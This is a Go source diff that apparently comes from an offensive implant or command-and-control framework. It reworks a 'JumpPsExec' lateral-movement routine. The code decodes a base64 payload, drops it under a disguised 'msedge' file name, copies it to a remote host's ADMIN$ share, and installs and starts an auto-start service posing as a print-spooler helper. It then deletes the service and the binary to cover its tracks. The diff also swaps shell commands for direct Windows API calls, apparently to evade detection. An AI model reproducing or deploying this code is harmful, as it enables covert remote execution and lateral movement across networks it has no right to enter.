@@ -1,5 +1,6 @@
 package execution
 
+
 import (
 	"crypto/rand"
 	"encoding/base64"
@@ -7,9 +8,13 @@ import (
 	"fmt"
 	"io"
 	"os"
-	"os/exec"
 	"path/filepath"
+	"syscall"
 	"time"
+	"unsafe"
+
+	"golang.org/x/sys/windows"
+	"golang.org/x/sys/windows/svc/mgr"
 )
 
 func randomHex(n int) string {
@@ -18,54 +23,132 @@ func randomHex(n int) string {
 	return hex.EncodeToString(b)[:n]
 }
 
-func cleanRemoteArtifacts(server, binPath, serviceName string) {
-	cleanupCmd := fmt.Sprintf(
-		`schtasks /create /S %s /TN "OneDriveUpdate_%s" /TR "cmd /c del /f %s && sc delete %s" /ST %s /RU SYSTEM /F`,
-		server,
-		randomHex(4),
-		binPath,
-		serviceName,
-		time.Now().Add(5*time.Minute).Format("15:04"),
+func copyFile(src, dst string) error {
+	srcPtr, _ := syscall.UTF16PtrFromString(src)
+	dstPtr, _ := syscall.UTF16PtrFromString(dst)
+
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	copyFileW := kernel32.NewProc("CopyFileW")
+
+	// CopyFileW(lpExistingFileName, lpNewFileName, bFailIfExists)
+	// bFailIfExists = 0 means overwrite existing file
+	r1, _, err := copyFileW.Call(
+		uintptr(unsafe.Pointer(srcPtr)),
+		uintptr(unsafe.Pointer(dstPtr)),
+		uintptr(0), // Overwrite existing file
 	)
-	_ = exec.Command("cmd", "/C", cleanupCmd).Run()
+	if r1 == 0 {
+		return fmt.Errorf("CopyFileW failed: %w", err)
+	}
+	return nil
+}
+
+func deleteRemoteFile(path string) error {
+	pathPtr, _ := syscall.UTF16PtrFromString(path)
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	deleteFile := kernel32.NewProc("DeleteFileW")
+
+	r1, _, err := deleteFile.Call(uintptr(unsafe.Pointer(pathPtr)))
+	if r1 == 0 {
+		return fmt.Errorf("DeleteFileW failed: %w", err)
+	}
+	return nil
+}
+
+func scheduleCleanup(server, binPath, serviceName string) {
+	go func() {
+		time.Sleep(5 * time.Minute)
+
+		// Connect to remote service manager
+		m, err := mgr.ConnectRemote(server)
+		if err != nil {
+			return
+		}
+		defer m.Disconnect()
+
+		// Open service
+		s, err := m.OpenService(serviceName)
+		if err != nil {
+			// Service might be already deleted, just remove binary
+			fullPath := fmt.Sprintf(`\\%s\ADMIN$\%s`, server, filepath.Base(binPath))
+			deleteRemoteFile(fullPath)
+			return
+		}
+		defer s.Close()
+
+		// Stop service if running
+		status, err := s.Query()
+		if err == nil && status.State != windows.SERVICE_STOPPED {
+			s.Control(windows.SERVICE_CONTROL_STOP)
+			time.Sleep(2 * time.Second)
+		}
+
+		// Delete service
+		s.Delete()
+
+		// Delete binary
+		fullPath := fmt.Sprintf(`\\%s\ADMIN$\%s`, server, filepath.Base(binPath))
+		deleteRemoteFile(fullPath)
+	}()
 }
 
 func JumpPsExec(encodedSrcFile, server string) string {
 	serviceName := "SpoolerSvc_" + randomHex(6)
 	binName := serviceName + ".exe"
+
+	// Decode payload
 	decodedData, err := base64.StdEncoding.DecodeString(encodedSrcFile)
 	if err != nil {
 		return fmt.Sprintf("[!] Decode failed: %v", err)
 	}
 
-	tempDir := "C:\\ProgramData"
+	// Write to temp file
+	tempDir := os.Getenv("TEMP")
+	if tempDir == "" {
+		tempDir = "C:\\Windows\\Temp"
+	}
 	localFile := filepath.Join(tempDir, fmt.Sprintf("msedge_%d.exe", time.Now().UnixNano()))
 	if err := os.WriteFile(localFile, decodedData, 0644); err != nil {
 		return fmt.Sprintf("[!] Temp file write failed: %v", err)
 	}
 	defer os.Remove(localFile)
 
-	copyCmd := fmt.Sprintf(
-		`Copy-Item -Path "%s" -Destination "\\%s\ADMIN$\%s" -Force`,
-		localFile, server, binName,
+	// Copy file via Windows API
+	remoteBinPath := fmt.Sprintf(`\\%s\ADMIN$\%s`, server, binName)
+	if err := copyFile(localFile, remoteBinPath); err != nil {
+		return fmt.Sprintf("[!] Copy failed: %v", err)
+	}
+
+	// Service installation
+	m, err := mgr.ConnectRemote(server)
+	if err != nil {
+		return fmt.Sprintf("[!] SC connect failed: %v", err)
+	}
+	defer m.Disconnect()
+
+	// Create service
+	servicePath := `C:\Windows\` + binName
+	s, err := m.CreateService(
+		serviceName,
+		servicePath,
+		mgr.Config{
+			StartType:   mgr.StartAutomatic,
+			DisplayName: "Print Spooler Helper",
+			Description: "Manages printer spooling operations",
+		},
 	)
-	if out, err := exec.Command("powershell", "-Command", copyCmd).CombinedOutput(); err != nil {
-		return fmt.Sprintf("[!] Copy failed: %v\nOutput: %s", err, out)
+	if err != nil {
+		return fmt.Sprintf("[!] Service create failed: %v", err)
+	}
+	defer s.Close()
+
+	// Start service
+	if err := s.Start(); err != nil {
+		return fmt.Sprintf("[!] Service start failed: %v", err)
 	}
 
-	remoteBinPath := fmt.Sprintf(`C:\Windows\%s`, binName)
-
-	createCmd := fmt.Sprintf(`sc \\%s create "%s" binPath= "C:\Windows\%s" start= auto`, server, serviceName, binName)
-	if out, err := exec.Command("cmd", "/C", createCmd).CombinedOutput(); err != nil {
-		return fmt.Sprintf("[!] Service create failed: %v\nOutput: %s", err, out)
-	}
-
-	startCmd := fmt.Sprintf(`sc \\%s start "%s"`, server, serviceName)
-	if out, err := exec.Command("cmd", "/C", startCmd).CombinedOutput(); err != nil {
-		return fmt.Sprintf("[!] Service start failed: %v\nOutput: %s", err, out)
-	}
-
-	cleanRemoteArtifacts(server, remoteBinPath, serviceName)
+	// Schedule cleanup
+	scheduleCleanup(server, servicePath, serviceName)
 
 	return fmt.Sprintf("[+] PsExec completed on %s (service: %s)", server, serviceName)
 }
